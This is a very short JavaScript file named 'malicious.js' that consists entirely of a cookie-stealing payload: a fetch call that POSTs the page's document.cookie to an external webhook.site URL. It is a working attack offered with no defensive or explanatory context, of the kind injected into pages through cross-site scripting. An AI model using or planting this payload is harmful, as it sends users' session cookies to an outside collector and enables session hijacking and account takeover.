// malicious.js
fetch('https://webhook.site/4e96d0f1-3687-4020-8873-c4e886404a47/log', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: `cookies=${document.cookie}`
});
